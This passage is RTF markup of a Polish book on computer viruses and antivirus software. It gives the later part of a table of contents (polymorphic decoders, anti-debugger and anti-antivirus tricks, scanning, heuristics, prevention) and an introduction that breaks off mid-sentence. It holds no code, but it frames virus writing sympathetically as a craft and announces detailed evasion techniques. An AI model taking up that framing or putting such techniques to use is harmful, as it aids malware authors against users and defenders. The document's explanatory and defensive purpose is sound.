\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 8.2.1. Polimorficzne procedury dekoduj\uc1\u261\'b9ce ...................       }{\f1\fs24\lang1045{\*\listtag0}179}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 8.2.1.1. Semi-polimorfizm ........................................   179}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 8.2.1.2. Pe\uc1\u322\'b3ny polimorfizm ........................................   193}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 9. Inne mechanizmy stosowane przez wirusy .....    213}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 9.1. Sposoby dost\uc1\u281\'eapu do dysk\'f3w ..........}{\f1\fs24\lang1045{\*\listtag0}................      215}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 9.2. Sztuczki antydebuggerowe, antydeasemblerowe, antyemulacyj-}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ne i antyheurystyczne ....................................   227}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 9.3. Optymalizacje kodu ..................................      231}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 9.4. Retrostruktury (techniki anty-antywirusowe), czyli walka z zainstalowanymi monitorami antywirusowymi ....................   232}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 10. Przysz\uc1\u322\'b3o\uc1\u347\'9c\uc1\u263\'e6 wirus\'f3w .........................  235}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 10.1. Wirusy dla r\'f3\uc1\u380\'bfnych system\'f3w (ang. multisystem, multiplatform}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch viruses) .............................................   237}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 10.2. Wirusy infekuj\uc1\u261\'b9ce wewn\uc1\u261\'b9trzplikowo (ang, surface infectors)       238}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 10.3. Wirusy zmienne genetycznie (mutuj\uc1\u261\'b9ce sw\'f3j kod) ........      238}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 10.4. Wirusy infekuj\uc1\u261\'b9ce nowe, nie infekowane doty}{\f1\fs24\lang1045{\*\listtag0}chczas obiekty      239}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 11. Rodzaje program\'f3w antywirusowych .........    241}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11.1. Skanery (ang. scaners) .............................      243}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11.2. Monitory (ang. behaviour blockers, interceptors, resident}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch monitors) ............................................   243}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11.3. Szczepionki (ang. disinfectors) .......................      244}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11.4. Programy autoweryfikuj\uc1\u261\'b9ce ..........................      244}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11.5. Programy zliczaj\uc1\u261\'b9ce sumy kontrolne (ang. integniy checkers).     245}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 12. Techniki u\uc1\u380\'bfywane przez programy antywirusowe .......................................    247}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 12.1. Skaning ..........................................      249}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 12.2. Heurystycze wyszukiwanie wirus\'f3w ....................      272}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 12.3. Tryb krokowy ......................................     284}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 12.4. Emulacja procesora .................................      284}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 12.5. Przyn\uc1\u281\'eaty (ang. baits, decoys) .........................      285}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 12.6. Od\uc1\u347\'9cwie\uc1\u380\'bfanie program\'f3w systemowych w sektorach .......      285}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 12.7. Blokowanie}{\f0\fs24\lang1045{\*\listtag0} program\'f3w u\uc1\u380\'bfywaj\uc1\u261\'b9cych trybu krokowego .....      286}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 12.8. Pobieranie wielko\uc1\u347\'9cci pami\uc1\u281\'eaci operacyjnej ...............      291}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 13. Konwencje stosowane przez programy antywiru-}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch sowe - standard CARO ..............................\tab 299}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 14. Pro}{\f1\fs24\b\lang1045{\*\listtag0}filaktyka antywirusowa ..................\tab 311}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 14.1. Ochrona przed wirusami plik\'f3w uruchamialnych .........\tab 313}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 14.2. Ochrona przed bombami logicznymi i ko\uc1\u324\'f1mi troja\uc1\u324\'f1skimi ...\tab 315}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 14.3. Ochrona przed makrowirusami ........................\tab 316}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 15. Li}{\f1\fs24\b\lang1045{\*\listtag0}teratura ...............................\tab 319}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch Wst\uc1\u281\'eap}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tematem niiejszego opracowania s\uc1\u261\'b9 wirusy komputerowe jeden z najbardziej tajemniczych i kontrowersyjnych twor\'f3w istniej\uc1\u261\'b9cych w \uc1\u347\'9cwiecie komputer\'f3w.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Od pocz\uc1\u261\'b9tku swego istnienia wirusy komputerowe by\uc1\u322\'b3y owiane mg\uc1\u322\'b3\uc1\u261\'b9 tajemnicy za\uc1\u347\'9c ich tw\'f3rc\'f3w uznawano za ludzi wiedz\uc1\u261\'b9cych znacznie wi\uc1\u281\'eacej ni\uc1\u380\'bf zwykli \uc1\u347\'9cmiertelnicy. Tymczasem wirus to zwyk\uc1\u322\'b3y program komputerowy kt\'f3ry cho\uc1\u263\'e6 mo\uc1\u380\'bfe bardziej wyrafinowany od innych jest na pewno o wiele \uc1\u322\'b3atwiejszy do napisania ni\uc1\u380\'bf j}{\f1\fs24\lang1045{\*\listtag0}a}{\f0\fs24\lang1045{\*\listtag0}kakolwiek aplikacja u\uc1\u380\'bfytkowa czy gra.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 spotykanych wirus\'f3w to prymitywne przer\'f3bki, bazuj\uc1\u261\'b9ce na istniej\uc1\u261\'b9cych od dawna, klasycznych ju\uc1\u380\'bf i uznawanych za wzorcowe wirusach, takich Jak Jerusalem, Vienna, Stoned, Vacsina czy wirusy Dark Avengera. Przer\'f3bki ograniczaj\uc1\u261\'b9 si\uc1\u281\'ea najcz\uc1\u281\'ea\uc1\u347\'9cciej do zmiany tekstu wewn\uc1\u261\'b9trz wirusa lub ewentualnie sekwencji kodu, czego wynikiem jest kolejna z licznych mutacji znanego wirusa. Opr\'f3cz nich istnieje bardzo ma\uc1\u322\'b3a grupa wirus\'f3w, kt\'f3rych pojawienie si\uc1\u281\'ea na komputerowej scenie }{\f1\fs24\lang1045{\*\listtag0}w}{\f0\fs24\lang1045{\*\listtag0}i\uc1\u261\'b9za\uc1\u322\'b3o si\uc1\u281\'ea z zastosowaniem przez ich autor\'f3w nowych, nieznanych jeszcze nikomu sztuczek. Do tych ostatnich zaliczaj\uc1\u261\'b9 si\uc1\u281\'ea niew\uc1\u261\'b9tpliwie wirusy wspomnianego ju\uc1\u380\'bf wy\uc1\u380\'bfej Dark Avengera, najs\uc1\u322\'b3ynniejszego chyba tw\'f3rcy wirus\'f3w komputerowych. On to w\uc1\u322\'b3a\uc1\u347\'9cnie jako pier}{\f1\fs24\lang1045{\*\listtag0}w}{\f0\fs24\lang1045{\*\listtag0}szy zastosowa\uc1\u322\'b3 metod\uc1\u281\'ea zmiennych procedur szyfruj\uc1\u261\'b9cych w swym polimorficznym enginie MtE, a tak\uc1\u380\'bfe jako jeden z pierwszych potrafi\uc1\u322\'b3 omija\uc1\u263\'e6 zainstalowane monitory antywirusowe, czy odnajdywa\uc1\u263\'e6 oryginalne wej\uc1\u347\'9ccia do znajduj\uc1\u261\'b9cych si\uc1\u281\'ea w BIOS-ie procedur obs\uc1\u322\'b3ugi }{\f1\fs24\lang1045{\*\listtag0}przerwania 13h.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Pojawienie si\uc1\u281\'ea nowego wirusa infekuj\uc1\u261\'b9cego nie zaj\uc1\u281\'eat\uc1\u261\'b9 jeszcze do tej pory platform\uc1\u281\'ea sprz\uc1\u281\'eatow\uc1\u261\'b9 lub programow\uc1\u261\'b9 budzi zwykle nie lada sensacj\uc1\u281\'ea, zw\uc1\u322\'b3aszcza gdy w spraw\uc1\u281\'ea wmieszaj\uc1\u261\'b9 si\uc1\u281\'ea media, \uc1\u380\'bferuj\uc1\u261\'b9ce na}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch tego typu historiach. Pomimo \uc1\u380\'bfe najcz\uc1\u281\'ea\uc1\u347\'9cciej trywialny, wirus taki otwiera bowiem kolejn\uc1\u261\'b9 furtk\uc1\u281\'ea dla ca\uc1\u322\'b3ej rzeszy p\'f3\uc1\u378\'9fniejszych racjonalizator\'f3w oraz wywo\uc1\u322\'b3uje istn\uc1\u261\'b9 lawin\uc1\u281\'ea komentarzy na temat bezpiecze\uc1\u324\'f1stwa system\'f3w komputerowych.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch tak wida\uc1\u263\'e6, tw\'f3rcy wirus\'f3w tworz\uc1\u261\'b9 \uc1\u347\'9crodowisko rz\uc1\u261\'b9dz\uc1\u261\'b9ce si\uc1\u281\'ea swoimi w\uc1\u322\'b3asnymi prawami. Ca\uc1\u322\'b3y czas trwa wy\uc1\u347\'9ccig nad wymy\uc1\u347\'9cleniem jeszcze lepszych lub ca\uc1\u322\'b3kowicie nowych, nieznanych wirus\'f3w. Ciekawa przyk\uc1\u322\'b3ad tw\'f3rczego podej\uc1\u347\'9ccia do programowania wirus\'f3w zademonstrowa\uc1\u322\'b3 autor ukrywaj\uc1\u261\'b9cy si\uc1\u281\'ea pod pseudonimem Stormbringer w wirusie JUMP. Nazw}{\f1\fs24\lang1045{\*\listtag0}a}{\f0\fs24\lang1045{\*\listtag0} wirusa nie jest przypadkowa, gdy\uc1\u380\'bf, po de-asemblacji listing tego wirusa sk\uc1\u322\'b3ada si\uc1\u281\'ea tylko i wy\uc1\u322\'b3\uc1\u261\'b9cznie z samych rozkaz\'f3w skok\'f3w (w\uc1\u322\'b3a\uc1\u347\'9cciwy kod zosta\uc1\u322\'b3 sprytnie ukryty wewn\uc1\u261\'b9trz wirusa).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Prymat w programowaniu wirus\'f3w wiod\uc1\u261\'b9 niezaprzeczalnie mieszka\uc1\u324\'f1cy pa\uc1\u324\'f1stw by\uc1\u322\'b3ego bloku wschodniego, g\uc1\u322\'b3\'f3wnie Bu\uc1\u322\'b3garzy, Rosjanie i S\uc1\u322\'b3owacy. Dzieje si\uc1\u281\'ea tak g\uc1\u322\'b3\'f3wnie z powodu braku, w tych krajach unormowa\uc1\u324\'f1 prawnych dotycz\uc1\u261\'b9cych przest\uc1\u281\'eapstw komputerowych, kt\'f3re istniej\uc1\u261\'b9 ju\uc1\u380\'bf w wielu pa\uc1\u324\'f1stwach zachodnich.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W dobie globalnej ekspansji sieci}{\f0\fs24\lang1045{\*\listtag0} Internet w zasadzie ka\uc1\u380\'bfda osoba chc\uc1\u261\'b9ca dowiedzie\uc1\u263\'e6 si\uc1\u281\'ea czego\uc1\u347\'9c o wirusach mo\uc1\u380\'bfe dosta\uc1\u263\'e6 si\uc1\u281\'ea do bogatych, istniej\uc1\u261\'b9cych na ca\uc1\u322\'b3ym \uc1\u347\'9cwiecie archiw\'f3w, po\uc1\u347\'9cwi\uc1\u281\'eaconych w ca\uc1\u322\'b3o\uc1\u347\'9cci programowaniu wirus\'f3w. Oferuj\uc1\u261\'b9 one wirusy w wersji \uc1\u378\'9fr\'f3d\uc1\u322\'b3owej, generatory wirus\'f3w, kolekcje}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}z\uc1\u322\'b3apanych egzemplarzy wirus\'f3w, a tak\uc1\u380\'bfe tzw. ziny, czyli prowadzone przez wyspecjalizowane grupy magazyny (w postaci plik\'f3w tekstowych lub stron HTML), po\uc1\u347\'9cwi\uc1\u281\'eacone programowaniu wirus\'f3w (np.: 40HEX, VLAD, NukE InfoJournal, VBB, Immortal Riot). Za spraw\uc1\u261\'b9 Int}{\f1\fs24\lang1045{\*\listtag0}e}{\f0\fs24\lang1045{\*\listtag0}metu w sk\uc1\u322\'b3ad grup prowadz\uc1\u261\'b9cych te magazyny wchodz\uc1\u261\'b9 ludzie ze wszystkich stron \uc1\u347\'9cwiata, kt\'f3rzy, co ciekawe, najcz\uc1\u281\'ea\uc1\u347\'9cciej deklaruj\uc1\u261\'b9 si\uc1\u281\'ea jako zagorzali przeciwnicy wirus\'f3w destrukcyjnych, a samo programowanie wirus\'f3w traktuj\uc1\u261\'b9 jako swoist\uc1\u261\'b9 sztuk\uc1\u281\'ea. Po cz\uc1\u281\'ea\uc1\u347\'9cci maj\uc1\u261\'b9 racj\uc1\u281\'ea, gdy\uc1\u380\'bf pisanie wirus\'f3w jest nie tylko \uc1\u347\'9cwietn\uc1\u261\'b9 okazj\uc1\u261\'b9 do dog\uc1\u322\'b3\uc1\u281\'eabnego poznania systemu operacyjnego, ale i sprawdzenia w\uc1\u322\'b3asnych umiej\uc1\u281\'eatno\uc1\u347\'9cci programistycznych.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Liczba wirus\'f3w z\uc1\u322\'b3apanych na \uc1\u347\'9cwiecie ro\uc1\u347\'9cnie z roku na rok i nic me wykazuje na to, aby tendencja ta mia\uc1\u322\'b3a ulec gwa\uc1\u322\'b3townej zmianie. W kolekcji wirus\'f3w nale\uc1\u380\'bf\uc1\u261\'b9cej do jednej z czo\uc1\u322\'b3owych firm ameryka\uc1\u324\'f1skich produkuj\uc1\u261\'b9cej programy antywirusowe znajduje si\uc1\u281\'ea obecnie ponad 20000 pr\'f3bek wirus\'f3w, z czego ok. 6000 to wirusy ca\uc1\u322\'b3kowicie}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch r\'f3\uc1\u380\'bfne. Nale\uc1\u380\'bfy pami\uc1\u281\'eata\uc1\u263\'e6, i\uc1\u380\'bf istnienie wirus\'f3w komputerowych jest \uc1\u347\'9cci\uc1\u347\'9cle zwi\uc1\u261\'b9zane z niedoskona\uc1\u322\'b3o\uc1\u347\'9cci\uc1\u261\'b9 zara\uc1\u380\'bfanych przez nie system\'f3w operacyjnych. Tw\'f3rcy wirus\'f3w skrz\uc1\u281\'eatnie wykorzystuj\uc1\u261\'b9 do swych cel\'f3w wszelkie mo\uc1\u380\'bfliwe luki w systemie: nieudokumentowane funkcje, systemowe struktury danyc}{\f1\fs24\lang1045{\*\listtag0}h}{\f0\fs24\lang1045{\*\listtag0}, a nawet odnalezione w\uc1\u322\'b3asnor\uc1\u281\'eacznie b\uc1\u322\'b3\uc1\u281\'eady w kodzie systemu. To w\uc1\u322\'b3a\uc1\u347\'9cnie wirusy - paradoksalnie - po\uc1\u347\'9crednio wp\uc1\u322\'b3ywaj\uc1\u261\'b9 na wzrost bezpiecze\uc1\u324\'f1stwa system\'f3w komputerowych, gdy\uc1\u380\'bf kolejne wersje r\'f3\uc1\u380\'bfnych \uc1\u347\'9crodowisk zwykle staraj\uc1\u261\'b9 si\uc1\u281\'ea za\uc1\u322\'b3ata\uc1\u263\'e6 istniej\uc1\u261\'b9ce luki w systemie}{\f1\fs24\lang1045{\*\listtag0}.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Osobne miejsce w dyskusjach na temat wirus\'f3w zajmuj\uc1\u261\'b9 programy antywirusowe (w literaturze cz\uc1\u281\'easto okre\uc1\u347\'9clane skr\'f3tem AV). O ile pisanie wirus\'f3w jest raczej indywidualnym procesem tw\'f3rczym, o tyle pisanie skutecznych program\'f3w antywirusowych sta\uc1\u322\'b3o si\uc1\u281\'ea domen\uc1\u261\'b9 ca\uc1\u322\'b3ych grup programistycznych, kt\'f3rych cz\uc1\u322\'b3onkowie musz\uc1\u261\'b9 posiada\uc1\u263\'e6 o wiele wi\uc1\u281\'eaksz\uc1\u261\'b9 wiedz\uc1\u281\'ea na temat wirus\'f3w ni\uc1\u380\'bf typowy tw\'f3rca wirus\'f3w. Usuwanie wirus\'f3w jest procesem naprawczym, a to wi\uc1\u261\'b9\uc1\u380\'bfe si\uc1\u281\'ea z odpowiedzialno\uc1\u347\'9cci\uc1\u261\'b9, kt\'f3r\uc1\u261\'b9 musz\uc1\u261\'b9 wzi\uc1\u261\'b9\uc1\u263\'e6 na siebie tw\'f3rcy program}{\f1\fs24\lang1045{\*\listtag0}\'f3}{\f0\fs24\lang1045{\*\listtag0}w AV. Autorzy wirus\'f3w nie musz\uc1\u261\'b9 przejmowa\uc1\u263\'e6 si\uc1\u281\'ea ewentualnymi szkodami powsta\uc1\u322\'b3ymi na skutek ich b\uc1\u322\'b3\uc1\u281\'eadu lub nawet zwyk\uc1\u322\'b3ej niewiedzy. W przypadku program\'f3w AV nie mo\uc1\u380\'bfna pozwoli\uc1\u263\'e6 sobie nawet na najmniejsze potkni\uc1\u281\'eacie. O ile dodawanie do skanera kolejnych sygnat}{\f1\fs24\lang1045{\*\listtag0}u}{\f0\fs24\lang1045{\*\listtag0}r typowych i trywialnych wirus\'f3w to zaj\uc1\u281\'eacie zajmuj\uc1\u261\'b9ce niewiele czasu, o tyle dekodo-wanie i rozszyfrowywanie kodu najnowszych wirus\'f3w, u\uc1\u380\'bfywaj\uc1\u261\'b9cych kilkustopniowych zmiennych procedur szyfruj\uc1\u261\'b9cych, sztuczek anty-emulacyjnych, antydebuggerowych i antydeasem}{\f1\fs24\lang1045{\*\listtag0}b}{\f0\fs24\lang1045{\*\listtag0}lerowych, zara\uc1\u380\'bfaj\uc1\u261\'b9cych du\uc1\u380\'bf\uc1\u261\'b9 ilo\uc1\u347\'9c\uc1\u263\'e6 obiekt\'f3w i b\uc1\u281\'ead\uc1\u261\'b9cych zwykle wolnymi infektorami, to zadanie zajmuj\uc1\u261\'b9ce bardzo du\uc1\u380\'bfo czasu, a i tak cz\uc1\u281\'easto okazuje si\uc1\u281\'ea, i\uc1\u380\'bf zastosowana metoda nic umo\uc1\u380\'bfliwia odnalezienia wszystkich wariant\'f3w wirusa.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Aby przyspieszy\uc1\u263\'e6 wymian\uc1\u281\'ea informacji na temat wirus\'f3w, autorzy r\'f3\uc1\u380\'bfnych program\'f3w antywirusowych z ca\uc1\u322\'b3ego \uc1\u347\'9cwiata utworzyli co\uc1\u347\'9c w rodzaju organizacji, kt\'f3ra zajmuje si\uc1\u281\'ea zbieraniem danych o istniej\uc1\u261\'b9cych wirusach oraz o technikach ich wykrywania i usuwania.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Poni\uc1\u380\'bfsze rozdzia\uc1\u322\'b3y powinny przynajmniej cz\uc1\u281\'ea\uc1\u347\'9cciowo wyja\uc1\u347\'9cni\uc1\u263\'e6 mechanizmy wykorzystywane przez nowoczesne wirusy i programy antywirusowe. Opr\'f3cz typowych i trywialnych sztuczek, stosowanych od dawna przez wy\uc1\u380\'bfej wymienione programy, om\'f3wionych zosta\uc1\u322\'b3o kilka bardziej zaawansowanych technik, }{\f1\fs24\lang1045{\*\listtag0}m}{\f0\fs24\lang1045{\*\listtag0}.in.:polimorfizm (wykorzystywanie zmiennych procedur szyfruj\uc1\u261\'b9cych);}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch >  stealth (zaawansowane ukrywanie si\uc1\u281\'ea w systemie);}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch >  heurystyka (wykrywanie nowych, nieznanych wirus\'f3w na podstawie znajomo\uc1\u347\'9cci charakterystycznych ci\uc1\u261\'b9g\'f3w instrukcji).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Do zrozumienia ca\uc1\u322\'b3o\uc1\u347\'9cci materia\uc1\u322\'b3u niezb\uc1\u281\'eadna jest podstawowa znajomo\uc1\u347\'9c\uc1\u263\'e6 komputer\'f3w PC oraz system\'f3w DOS i WINDOWS. Niezb\uc1\u281\'eadna jest tak\uc1\u380\'bfe przynajmniej pobie\uc1\u380\'bfna znajomo\uc1\u347\'9c\uc1\u263\'e6 asemblera procesor\'f3w 80x86 i jakiego\uc1\u347\'9c j\uc1\u281\'eazyka wysokiego poziomu (np.: Pascal, C). Niezorientowanego czytelnika}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}odsy\uc1\u322\'b3am do pozycji umieszczonych w spisie na ko\uc1\u324\'f1cu ksi\uc1\u261\'b9\uc1\u380\'bfki.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Dla uproszczenia, w opracowaniu zosta\uc1\u322\'b3a zastosowana pewna konwencja, dotycz\uc1\u261\'b9ca u\uc1\u380\'bfywania w tek\uc1\u347\'9ccie funkcji systemu DOS i BIOS. Wyst\uc1\u281\'eapuj\uc1\u261\'b9ce w tek\uc1\u347\'9ccie skr\'f3ty (XXXX/YY) oznaczaj\uc1\u261\'b9 u\uc1\u380\'bfycie funkcji XXXX przerwania programowego YY. Zapis (4B00/21) oznacza\uc1\u263\'e6 wi\uc1\u281\'eac b\uc1\u281\'eadzie instrukcj\uc1\u281\'ea uruchomienia programu przy u\uc1\u380\'bfyciu funkcji 4B00h przerwania programowego 21h obs\uc1\u322\'b3ugiwanego przez DOS, a (4E/4F/21) oznacza\uc1\u263\'e6 b\uc1\u281\'eadzie wywo\uc1\u322\'b3anie funkcji 4Eh lub 4Fh przerwania programow}{\f1\fs24\lang1045{\*\listtag0}e}{\f0\fs24\lang1045{\*\listtag0}go 21h, w tym przypadku realizuj\uc1\u261\'b9cych poszukiwania pierwszej (funkcja 4Eh) lub kolejnej (funkcja 4Fh) pozycji katalogu. Dok\uc1\u322\'b3adny opis funkcji systemu DOS i BIOS mo\uc1\u380\'bfna znale\uc1\u378\'9f\uc1\u263\'e6 w wielu r\'f3\uc1\u380\'bfnych opracowaniach, z kt\'f3rych najlepszym i najpe\uc1\u322\'b3niejszym wydaje 